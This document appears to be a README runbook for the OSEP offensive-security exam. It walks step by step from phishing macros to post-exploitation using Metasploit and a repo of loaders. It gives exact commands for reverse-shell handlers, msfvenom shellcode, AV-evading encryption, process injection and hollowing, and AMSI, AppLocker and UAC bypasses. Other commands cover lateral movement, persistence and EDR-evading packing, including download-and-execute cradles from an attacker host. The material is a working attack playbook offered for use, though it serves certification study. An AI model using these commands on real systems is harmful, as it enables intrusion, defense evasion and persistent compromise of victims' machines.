# OSEP Runbook — Metasploit + osep-tools (step-wise)

One decision tree from initial access to post-exploitation. Each row is:
**situation → technique → exact command** (file references are to this repo).

Legend: `<IP>` = your attacker IP, `<TARGET>` = victim host, `<PORT>` = your C2 port.

---

## Quick start — the panic-proof path

Forget the details — just follow this **top-down**, one step at a time. Each step tells
you **where to go** (section) and **what to run**.

| # | You want to… | Go here |
|---|---|---|
| 0 | Set up your C2 | Section 0 — copy-paste one `multi/handler` line |
| 1 | Learn the target (AppLocker? 32/64-bit?) | Section 1 — recon macro → watch apache2 log |
| 2 | Create the shellcode | Section 2 — `msfvenom` (staged ~500B vs stageless ~200KB) |
| 3 | Beat AV on the way in | Section 3 — Caesar → XOR → AES |
| 4 | Run it in memory | Section 4 — pick a C# runner |
| 5 | PowerShell keeps getting blocked | Section 5 — AMSI/ETW bypass first |
| 6 | AppLocker is ON | Section 6 — InstallUtil / msbuild / regsvr32 / SuperSharpShooter |
| 7 | Need admin | Section 7 — fodhelper UAC bypass |
| 8 | Move / stay | Section 8 (lateral) · 9 (persist) · 10 (CLM) |
| 9 | Defender still catches it | Section 11 — NimSyscallPacker |

**Where do I GET each tool?**

| Tool | How to get it |
|---|---|
| `msfvenom` / `msfconsole` | pre-installed on Kali (`which msfvenom`) |
| `apache2` | pre-installed on Kali (`sudo systemctl start apache2`, files → `/var/www/html/`) |
| `word-macro/`, `cs-loaders/`, `aes-loaders/`, `ps-loaders/`, `applocker/`, `uac-bypass/`, `lateral-movement/` | already in this repo |
| `NimSyscallPacker` (Section 11, optional) | `git clone https://github.com/S3cur3Th1sSh1t/NimSyscallPacker` → `nimsyscallpacker/README.md` |
| `SuperSharpShooter` (Section 6, optional) | `git clone https://github.com/ScriptIdiot/SuperSharpShooter` → `supersharpshooter/README.md` |

**If a session doesn't come back, check in this order:**
1. Handler `LPORT` matches the payload `LPORT`.
2. Payload arch matches the target (x64 vs x86).
3. apache2 is actually serving the file — `ls /var/www/html/`.
4. `jobs -l` shows the handler is running.

---

## 0. C2 setup (attacker, once)

```bash
# Start a Metasploit handler (pick ONE transport; reverse_tcp is the OSEP default)
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"

# reverse_https -> blends into TLS/443 (PAYLOAD windows/x64/meterpreter/reverse_https)
# reverse_http  -> blends into port 80  (PAYLOAD windows/x64/meterpreter/reverse_http)
# stageless     -> PAYLOAD windows/x64/meterpreter_reverse_tcp (self-contained ~200KB)

# Confirm the job is running (inside the msfconsole prompt):
#   jobs -l
```

| Situation | Payload / transport | Reason |
|---|---|---|
| Default / unknown egress | `windows/x64/meterpreter/reverse_tcp :8888` | Simplest, reliable |
| Target proxies web traffic | `windows/x64/meterpreter/reverse_https :443` | Blends into TLS/443 |
| Self-contained (no stage-2) | `windows/x64/meterpreter_reverse_tcp` | Stageless, ~200KB |

---

## 1. Initial access & recon

### Situation: you know nothing about the target (AppLocker? arch? Office bitness?)
**Use the recon macro** — phones home with a GET path telling you what to deploy next.

```bash
sudo systemctl start apache2
tail -f /var/log/apache2/access.log     # just watch the request path
```

1. Edit `word-macro/recon/starter-word-macro.vba`: set `serverURL` to `http://<IP>`.
2. Insert into Word (Alt+F11 → Insert → Module → paste → save as `.docm`).
3. Deliver (phish / upload).

Read the path in your HTTP logs:

| GET path | Meaning | Next step |
|---|---|---|
| `/applockeroff/os64_word64` | No AppLocker, 64-bit everywhere | Section 2 + any 64-bit runner |
| `/applockeroff/os64_word32` | No AppLocker, 32-bit Office | Use a 32-bit shellcode build |
| `/applockeron/...` | **AppLocker on** | Section 6 (InstallUtil/msbuild/regsvr32) |

### Situation: Office is present and macros run → Word macro
| AV pressure | Macro | Obfuscation | File |
|---|---|---|---|
| Low | Caesar runner | +2 (weak) | `word-macro/caesar-cipher/` |
| Medium | XOR runner | 3-byte XOR, W^X | `word-macro/xor-shellcode-runner/` |
| Medium-High | Alt runner | XOR + `HeapAlloc` + `EnumSystemGeoID` | `word-macro/alternative-shellcode-runner/` |

### Situation: no Office / macro blocking → HTA
| AppLocker | HTA | File |
|---|---|---|
| Off | PowerShell cradle (in-memory) | `hta-delivery/red.hta` |
| On | bitsadmin + InstallUtil | `hta-delivery/black.hta` |

Deliver: `mshta.exe http://<IP>/red.hta`

> **Payload type matters:** `black.hta` runs `installutil.exe /U` on a decoded `shell.exe`,
> which must be a **.NET InstallUtil payload** (compile
> `word-macro/installutil-applocker-bypass/installutil.cs`) — **not** a raw Go/Meterpreter implant,
> because InstallUtil only executes .NET assemblies. `red.hta` runs an in-memory PowerShell
> `payload.ps1` (no disk write).

### Situation: need an AppLocker-safe payload without PowerShell → SuperSharpShooter
Use **DotNetToJScript** (JScript/VBScript/HTA load a .NET runner in memory via
`cscript`/`wscript`/`mshta`) or **squiblytwo** XSL (`wmic`/`regsvr32`). Generate with the
optional `supersharpshooter/` tool — setup + examples in its `README.md`.

---

## 2. Generate shellcode (msfvenom)

```bash
# Stageless raw PIC (→ encrypt, or → NimSyscallPacker) — self-contained ~200KB
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc.bin

# Staged raw stager (→ tight VBA / shellcode runners) — ~500B
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager.bin

# Standalone EXE (→ NimSyscallPacker, or direct delivery)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f exe -o /tmp/implant.exe
```

### Situation: the injected blob must stay small (tight VBA / shellcode runner)
Use the **staged** payload (`windows/x64/meterpreter/reverse_tcp`) — the tiny stage-1
stager calls back to `multi/handler`, which then serves stage-2 (the full Meterpreter).

```bash
# Handler already running (Section 0). Generate the ~500B stage-1 stager:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager.bin
```

> **Staged vs stageless:** `meterpreter/reverse_tcp` (staged) is ~500B and needs the
> handler to serve stage-2. `meterpreter_reverse_tcp` (stageless) is ~200KB and
> self-contained — use it for the encrypt-then-run loaders (XOR/AES) and the
> NimSyscallPacker, where a single blob is fed straight into the runner.

Convert raw → array when needed:

```bash
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs   # C#  byte[]
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1 -o /tmp/sc.ps1     # PowerShell
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f vba -o /tmp/sc.vba     # VBA  Array(...)
```

> **Rule of thumb:** full stageless Meterpreter is ~200KB — only use it in C# runners
> that allocate `shellcode.Length` (all loaders in this repo now do). For VBA macros,
> generate a small staged stager (`-f vba`) instead.

---

## 3. Obfuscate / encrypt (anti-VV)

Weakest → strongest; pick based on how much Defender is watching.

| Level | Technique | Encryptor | Command |
|---|---|---|---|
| 1 | Caesar +2 | `word-macro/caesar-cipher/vba-caesar-cipher-encryption.cs` | compile → `Encrypter.exe shellcode.txt` |
| 2 | 3-byte XOR | `word-macro/*/xor-shellcode-encryption-3-byte.cs` | paste `buf` → compile → run |
| 3 | AES-256-CBC | `aes-loaders/aes-shellcode-encryption/aes-shellcode-encryption.cs` | paste `buf` → compile → run |

```powershell
# Compile an encryptor (Windows)
csc /target:exe /platform:x64 /optimize+ /out:Encrypter.exe aes-shellcode-encryption.cs
.\Encrypter.exe          # prints the encrypted byte[] to paste into a runner
```

---

## 4. Execution technique (post-initial-access)

| Situation | Technique | File | Why |
|---|---|---|---|
| Just need it to run (own process) | Self-injection (`VirtualAlloc`+`CreateThread`) | `aes-loaders/aes-normal-runner/` | Simplest |
| Migrate into another process | Remote injection (`CreateRemoteThread`) | `aes-loaders/aes-process-injection/` | Hide in notepad/explorer |
| AV/sandbox is aggressive | NUMA + evasion checks + remote inject | `aes-loaders/aes-av-evasion/` | `VirtualAllocExNuma`, timing/DLL checks |
| No `CreateRemoteThread` allowed | Process hollowing (svchost) | `aes-loaders/aes-process-hollowing/` | PEB walk, resume suspended process |
| EDR hooks `kernel32` inject APIs | Nt* direct APIs | `cs-loaders/nt-injection.cs` | `NtAllocateVirtualMemory`/`NtWriteVirtualMemory`/`NtCreateThreadEx` |
| Bypass thread-creation monitoring | Early-Bird APC | `cs-loaders/apc-injection.cs` | `QueueUserAPC` before thread runs |
| Kill static IAT signatures | Dynamic API resolution | `cs-loaders/dinvoke-runner.cs` | `GetProcAddress` at runtime |
| EDR hooked ntdll (syscalls) | ntdll `.text` unhooking | `cs-loaders/ntdll-unhook.cs` | Fresh copy from `\KnownDLLs` |

```powershell
# Compile + run any C# loader
csc /target:exe /platform:x64 /optimize+ /out:Runner.exe cs-loaders/nt-injection.cs
.\Runner.exe 1234            # (nt-injection takes a PID; others run as-is)
```

---

## 5. AMSI / ETW bypass (PowerShell path only)

Only needed when your payload runs through PowerShell (cradle, stager, runner).

| Situation | Tool | Command |
|---|---|---|
| Any PS execution | Inline AMSI patch | `amsi-bypass/amsi-bypass.ps1` |
| Download + run a PS payload in memory (kills AMSI+ETW+SBL first) | Reflective loader | `ps-loaders/ps-loader.ps1` (set `$PayloadUrl`) |
| Run raw shellcode via PS reflection | Reflection runner | `ps-loaders/ps-shellcode-runner.ps1` (paste `$buf`) |

```powershell
# Always bypass AMSI before running anything that'll get scanned:
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/amsi-bypass.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')
```

---

## 6. AppLocker bypass (when recon says `/applockeron`)

AppLocker blocks user-writable EXEs and PowerShell. Use Microsoft-signed LOLBins.

| Situation | Technique | File | Exact command |
|---|---|---|---|
| Full chain from a macro | InstallUtil | `word-macro/installutil-applocker-bypass/` | WMI → bitsadmin download → `installutil.exe /U` |
| Have shell, want code exec | msbuild inline task | `applocker/msbuild-shellcode.xml` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild-shellcode.xml` |
| Have shell, want code exec | regsvr32 scriptlet | `applocker/regsvr32.sct` | `regsvr32.exe /s /n /u /i:http://<IP>/regsvr32.sct scrobj.dll` |
| Have shell, want code exec (no PowerShell) | DotNetToJScript / squiblytwo | `supersharpshooter/` | `cscript.exe payload.js` or `wmic.exe os get /format:"http://<IP>/payload.xsl"` |

> **SuperSharpShooter** (optional) turns the Section 2 `msfvenom -f raw` shellcode into
> JScript/VBScript/HTA/macro payloads via DotNetToJScript, plus squiblytwo XSL for
> `wmic`/`regsvr32`. Setup + examples: `supersharpshooter/README.md`.

InstallUtil chain (from the macro):

```bash
# host three files
sudo systemctl start apache2
sudo cp InstallUtil.exe amsi.txt run.txt /var/www/html/
```

```powershell
# inside installutil.cs (already wired): downloads amsi.txt + run.txt, runs via IEX
csc /target:exe /platform:x64 /optimize+ /out:InstallUtil.exe installutil.cs `
  /r:"...\System.Management.Automation.dll" /r:System.Configuration.Install.dll
```

---

## 7. Privilege escalation (medium → high integrity)

| Situation | Tool | Command |
|---|---|---|
| Have a shell, need admin | fodhelper UAC bypass (`DelegateExecute`) | `uac-bypass/uac-bypass.ps1` |
| Newer Win10/11 (DelegateExecute patched) | fodhelper **CurVer** UAC bypass | `uac-bypass/uac-bypass-curver.ps1` |
| `cmstp.exe` available | CMSTP UAC bypass | `uac-bypass/cmstp.ps1` → `Bypass-UAC -Command "<cmd>"` |
| `eventvwr.exe` available | EventViewer UAC bypass | `uac-bypass/invoke-eventviewer.ps1` → `Invoke-EventViewer <cmd>` |

```powershell
# Set the elevated payload in uac-bypass.ps1, then:
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/uac-bypass.ps1')
```

---

## 8. Lateral movement

| Situation | Technique | File | Command |
|---|---|---|---|
| WinRM enabled / admin creds | PSRemoting | `lateral-movement/winrm-psremoting.ps1` | `.\\winrm-psremoting.ps1 -Computer <TARGET> -Credential $cred -StagerUrl http://<IP>/run.ps1` |
| Admin creds, WMI reachable | WMI `Win32_Process` | `lateral-movement/wmi-exec.ps1` | `.\\wmi-exec.ps1 -Computer <TARGET> -Credential $cred -StagerUrl http://<IP>/run.ps1` |
| Admin over SMB (no WinRM/WMI) | SMB named-pipe (fileless) | `lateral-movement/invoke-smbremoting.ps1` | `Invoke-SMBRemoting -ComputerName <TARGET>` / `-Command "<cmd>"` |
| Admin creds, service control | Service hijack (PsExec-style) | `lateral-movement/psexec-lat.cs` | compile → `PsExecLat.exe <TARGET> <payload>` |
| `sa` on MSSQL + CLR enabled | MSSQL CLR assembly | `lateral-movement/mssql-clr/` | `CREATE ASSEMBLY` → `cmd_exec 'whoami'` |

```powershell
# Interactive remote shell (instead of a script):
$s = New-PSSession -ComputerName <TARGET> -Credential $cred
Enter-PSSession $s
```

---

## 9. Persistence

| Situation | Tool | Section |
|---|---|---|
| Keep access across reboots/logons | `lateral-movement/persistence.ps1` | Run key / scheduled task / WMI event subscription |

```powershell
# Run in an elevated shell on the target after editing $Stager:
.\persistence.ps1
```

---

## 10. CLM bypass (Constrained Language Mode)

| Situation | Technique | Detail |
|---|---|---|
| `$ExecutionContext.SessionState.LanguageMode` = `ConstrainedLanguage` | PowerShell v2 downgrade | `powershell.exe -version 2` (if PSv2 present) |
| CLM + AppLocker | InstallUtil .NET loader | runs a fresh runspace outside CLM |
| CLM won't budge | Drop a compiled C# runner | `cs-loaders/` or `aes-loaders/` — CLM doesn't affect compiled code |

See `lateral-movement/clm-bypass.md`.

---

## 11. Defender / EDR is the real problem → NimSyscallPacker

When plain C#/PS/VBA loaders get caught, pack the payload as a Nim binary using
direct/indirect syscalls + ntdll unhooking + AMSI/ETW bypass.

```bash
# 1. Generate raw shellcode
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc.bin

# 2. Pack it (check exact flags with --help)
./NimSyscallLoader -f /tmp/sc.bin -o /tmp/loader.exe --unhook --indirect-syscalls

# 3. Start handler + deliver loader.exe
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
```

Build setup: see `nimsyscallpacker/README.md` (Nim 2.2.10 + MinGW-w64 11.1;
`nimble install nimcrypto@0.6.0 docopt ptr_math winim nim-strenc`). ⚠️ The tool is
deprecated/unmaintained — test on a lab VM before exam day.

---

## One-line mental model

1. **Recon** → macro phones home → know AppLocker + arch.
2. **Generate** → `msfvenom -p windows/x64/meterpreter[_]reverse_tcp LHOST=<IP> LPORT=8888 -f <raw|csharp|ps1|vba|exe>`; make arrays/stagers with `-f <format>`.
3. **Obfuscate** → Caesar < XOR < AES as AV pressure rises.
4. **Execute** → self-inject → remote-inject → hollowing → Nt* → APC → DInvoke → unhook, as EDR pressure rises.
5. **AppLocker** → InstallUtil / msbuild / regsvr32 / SuperSharpShooter (DotNetToJScript, squiblytwo). **PowerShell** → AMSI/ETW first.
6. **Elevate** → fodhelper. **Move** → WinRM/WMI. **Persist** → Run key / task / WMI event.
7. **Defender still wins** → NimSyscallPacker.


